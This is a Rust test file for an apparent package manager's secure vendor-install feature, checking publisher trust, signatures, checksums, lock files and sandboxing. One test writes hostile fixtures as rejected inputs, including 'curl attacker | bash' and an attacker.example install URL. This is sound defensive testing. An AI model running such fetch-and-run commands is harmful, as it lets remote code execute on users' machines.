use ed25519_dalek::{Signer, SigningKey};
use severian_package::{
    perform_installation, plan_installation, signature_payload, BuildSandbox, VendorPackage,
};
use sha2::{Digest, Sha256};
use std::path::PathBuf;
use std::sync::Mutex;
use std::time::{SystemTime, UNIX_EPOCH};

static ENVIRONMENT: Mutex<()> = Mutex::new(());

struct Fixture {
    root: PathBuf,
    home: PathBuf,
    package: PathBuf,
    artifact: PathBuf,
    signing: SigningKey,
}

impl Fixture {
    fn new() -> Self {
        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let root = std::env::temp_dir().join(format!(
            "severian-external-install-{}-{nonce}",
            std::process::id()
        ));
        let home = root.join("sev-home");
        let package = root.join("application");
        let artifact = root.join("rocm.artifact");
        std::fs::create_dir_all(package.join("src")).unwrap();
        std::fs::create_dir_all(home.join("trust")).unwrap();
        std::fs::write(
            package.join("src/lib.sev"),
            "def value() -> int:\n    return 1\n",
        )
        .unwrap();
        std::fs::write(&artifact, b"verified rocm fixture").unwrap();
        Self {
            root,
            home,
            package,
            artifact,
            signing: SigningKey::from_bytes(&[19; 32]),
        }
    }

    fn manifest(&self, publisher: &str, source: &str) {
        std::fs::write(
            self.package.join("package.toml"),
            format!(
                "[package]\nname = \"tensor_rocm\"\nversion = \"0.1.0\"\n\n[system]\nrocm = \">=7.0\"\n\n[install.rocm]\npublisher = {publisher:?}\npackage = \"rocm\"\nsource = {source:?}\n"
            ),
        )
        .unwrap();
    }

    fn trust(&self, name: &str, from: &str, until: &str, domain: &str) {
        std::fs::write(
            self.home.join("trust/publishers.toml"),
            format!(
                "[[publisher]]\nname = {name:?}\nallowed_domains = [{domain:?}]\nsigning_keys = [{:?}]\npackage_namespaces = [\"rocm\"]\ntrusted_from = {from:?}\ntrusted_until = {until:?}\nallow_system_install = true\n",
                encode(self.signing.verifying_key().as_bytes())
            ),
        )
        .unwrap();
    }

    fn catalog(&self, source: &str, hash: Option<String>, corrupt_signature: bool) -> String {
        let sha256 = hash.unwrap_or_else(|| {
            format!(
                "{:x}",
                Sha256::digest(std::fs::read(&self.artifact).unwrap())
            )
        });
        let mut package = VendorPackage {
            name: "rocm".into(),
            version: "7.0.1".into(),
            publisher: "amd".into(),
            source: source.into(),
            sha256,
            signature: String::new(),
            artifact: Some(self.artifact.clone()),
        };
        package.signature = encode(
            &self
                .signing
                .sign(signature_payload(&package).as_bytes())
                .to_bytes(),
        );
        if corrupt_signature {
            package.signature.replace_range(0..2, "00");
        }
        std::fs::write(
            self.home.join("trust/vendor-catalog.toml"),
            format!(
                "[[package]]\nname = {:?}\nversion = {:?}\npublisher = {:?}\nsource = {:?}\nsha256 = {:?}\nsignature = {:?}\nartifact = {:?}\n",
                package.name,
                package.version,
                package.publisher,
                package.source,
                package.sha256,
                package.signature,
                self.artifact.display().to_string()
            ),
        )
        .unwrap();
        package.sha256
    }

    fn path(&self) -> PathBuf {
        self.package.join("package.toml")
    }
}

impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

fn with_home(test: impl FnOnce(&Fixture)) {
    let _guard = ENVIRONMENT
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let fixture = Fixture::new();
    let previous = std::env::var_os("SEVERIAN_HOME");
    std::env::set_var("SEVERIAN_HOME", &fixture.home);
    test(&fixture);
    if let Some(previous) = previous {
        std::env::set_var("SEVERIAN_HOME", previous);
    } else {
        std::env::remove_var("SEVERIAN_HOME");
    }
}

#[test]
fn valid_trusted_vendor_install_is_verified_staged_and_locked() {
    with_home(|fixture| {
        fixture.manifest("amd", "vendor");
        fixture.trust("amd", "2000-01-01", "9999-12-31", "repo.radeon.com");
        fixture.catalog("https://repo.radeon.com/rocm/7.0.1/artifact", None, false);
        let plan = plan_installation(&fixture.path(), false).unwrap();
        assert_eq!(plan.items.len(), 1);
        perform_installation(&plan).unwrap();
        let lock = std::fs::read_to_string(fixture.package.join("sev.lock")).unwrap();
        assert!(lock.contains("[[external]]"));
        assert!(lock.contains("version = \"7.0.1\""));
        assert!(lock.contains("trusted_until = \"9999-12-31\""));
        assert!(fixture.home.join("external/rocm/7.0.1/artifact").is_file());
    });
}

#[test]
fn unknown_expired_and_wrong_domain_publishers_are_rejected() {
    with_home(|fixture| {
        fixture.manifest("unknown", "vendor");
        fixture.trust("amd", "2000-01-01", "9999-12-31", "repo.radeon.com");
        fixture.catalog("https://repo.radeon.com/rocm/7.0.1/artifact", None, false);
        assert!(plan_installation(&fixture.path(), false)
            .unwrap_err()
            .to_string()
            .contains("not trusted"));

        fixture.manifest("amd", "vendor");
        fixture.trust("amd", "2000-01-01", "2001-01-01", "repo.radeon.com");
        assert!(plan_installation(&fixture.path(), false)
            .unwrap_err()
            .to_string()
            .contains("outside its trust period"));

        fixture.trust("amd", "2000-01-01", "9999-12-31", "downloads.example.com");
        assert!(plan_installation(&fixture.path(), false)
            .unwrap_err()
            .to_string()
            .contains("not allowed"));
    });
}

#[test]
fn bad_checksum_and_bad_signature_are_rejected() {
    with_home(|fixture| {
        fixture.manifest("amd", "vendor");
        fixture.trust("amd", "2000-01-01", "9999-12-31", "repo.radeon.com");
        fixture.catalog(
            "https://repo.radeon.com/rocm/7.0.1/artifact",
            Some("11".repeat(32)),
            false,
        );
        let plan = plan_installation(&fixture.path(), false).unwrap();
        assert!(perform_installation(&plan)
            .unwrap_err()
            .to_string()
            .contains("checksum mismatch"));

        fixture.catalog("https://repo.radeon.com/rocm/7.0.1/artifact", None, true);
        assert!(plan_installation(&fixture.path(), false)
            .unwrap_err()
            .to_string()
            .contains("signature"));
    });
}

#[test]
fn executable_hooks_scripts_and_arbitrary_urls_are_rejected() {
    with_home(|fixture| {
        fixture.manifest("amd", "https://attacker.example/install.sh");
        assert!(plan_installation(&fixture.path(), false)
            .unwrap_err()
            .to_string()
            .contains("arbitrary URLs"));

        fixture.manifest("amd", "vendor");
        std::fs::write(fixture.package.join("install.sh"), "curl attacker | bash\n").unwrap();
        assert!(plan_installation(&fixture.path(), false)
            .unwrap_err()
            .to_string()
            .contains("forbidden installer"));
        std::fs::remove_file(fixture.package.join("install.sh")).unwrap();

        std::fs::write(fixture.package.join("bootstrap.py"), "import subprocess\n").unwrap();
        assert!(plan_installation(&fixture.path(), false)
            .unwrap_err()
            .to_string()
            .contains("forbidden installer"));
        std::fs::remove_file(fixture.package.join("bootstrap.py")).unwrap();

        std::fs::write(
            fixture.package.join("anything.ps1"),
            "Start-Process powershell\n",
        )
        .unwrap();
        assert!(plan_installation(&fixture.path(), false)
            .unwrap_err()
            .to_string()
            .contains("forbidden installer"));
        std::fs::remove_file(fixture.package.join("anything.ps1")).unwrap();

        std::fs::write(
            fixture.path(),
            "[package]\nname=\"bad\"\nversion=\"0.1.0\"\n[build]\ncommand=\"powershell setup.ps1\"\n",
        )
        .unwrap();
        assert!(plan_installation(&fixture.path(), false)
            .unwrap_err()
            .to_string()
            .contains("declarative only"));
    });
}

#[test]
fn locked_mode_rejects_version_mismatch_and_normal_resolution_preserves_external_entries() {
    with_home(|fixture| {
        fixture.manifest("amd", "vendor");
        fixture.trust("amd", "2000-01-01", "9999-12-31", "repo.radeon.com");
        fixture.catalog("https://repo.radeon.com/rocm/7.0.1/artifact", None, false);
        let plan = plan_installation(&fixture.path(), false).unwrap();
        perform_installation(&plan).unwrap();
        let lock_path = fixture.package.join("sev.lock");
        let original = std::fs::read_to_string(&lock_path).unwrap();
        std::fs::write(&lock_path, original.replace("7.0.1", "7.0.0")).unwrap();
        assert!(plan_installation(&fixture.path(), true)
            .unwrap_err()
            .to_string()
            .contains("--locked"));

        perform_installation(&plan).unwrap();
        severian_package::resolve_dependencies(&fixture.path()).unwrap();
        assert!(std::fs::read_to_string(lock_path)
            .unwrap()
            .contains("[[external]]"));
    });
}

#[test]
fn package_local_trust_cannot_authorize_itself_and_build_policy_has_no_ambient_authority() {
    with_home(|fixture| {
        fixture.manifest("attacker", "vendor");
        std::fs::create_dir_all(fixture.package.join("trust")).unwrap();
        std::fs::write(
            fixture.package.join("trust/publishers.toml"),
            "[[publisher]]\nname=\"attacker\"\n",
        )
        .unwrap();
        fixture.trust("amd", "2000-01-01", "9999-12-31", "repo.radeon.com");
        fixture.catalog("https://repo.radeon.com/rocm/7.0.1/artifact", None, false);
        assert!(plan_installation(&fixture.path(), false)
            .unwrap_err()
            .to_string()
            .contains("not trusted"));

        let sandbox = BuildSandbox::default();
        assert!(!sandbox.network);
        assert!(!sandbox.process_spawning);
        assert!(sandbox.package_filesystem_only);
    });
}

fn encode(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}
